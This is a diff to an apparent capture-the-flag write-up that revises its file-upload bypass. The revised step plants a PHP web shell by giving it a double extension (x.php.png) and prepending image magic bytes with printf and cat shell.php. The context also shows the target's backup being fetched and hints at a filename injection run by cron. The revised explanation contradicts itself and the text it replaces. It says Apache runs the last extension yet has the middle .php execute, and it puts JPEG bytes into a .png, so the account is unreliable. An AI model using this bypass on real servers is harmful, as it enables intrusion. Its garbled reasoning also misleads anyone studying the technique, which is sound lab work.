@@ -41,7 +41,12 @@ wget http://<IP>/backup/backup.tar && tar xf backup.tar && cat upload.php lib.ph
 
 ## Access
 
-1. **Upload bypass**: `upload.php` checks the extension against a whitelist and the MIME with `finfo`. A name like `x.php.jpg` passes both; Apache's `AddHandler application/x-httpd-php .php` (no `$` anchor) executes the middle `.php`.
+1. **Upload bypass**: `upload.php` validates the whitelist against the **first** extension and `finfo` against the content, while Apache executes the **last** one. The gap is neither: `x.php.jpg` and `x.php.png` keep a `.php` in the middle, the check accepts the trailing image extension, and with valid image magic bytes prepended the file still runs as PHP.
+
+```bash
+printf '\xff\xd8\xff\xe0' > x.php.png && cat shell.php >> x.php.png
+file x.php.png     # JPEG image data ...
+```
 
 ```bash
 cp shell.php shell.php.jpg
@@ -83,7 +88,7 @@ interface BOOTPROTO:     proto bash
 
 ## Pitfalls
 
-- **`AddHandler` with `.php.jpg`**: if the server only executes the final extension, look for another combination; here the middle one works.
+- **Double extension**: faking only the trailing extension is not enough if the content is not a real image; add the magic bytes.
 - **Cron every 3 minutes**: injection is not instant; wait for the next run.
 - **Quoting in the filename**: the name must stay valid; create it with `touch` and single quotes.
 
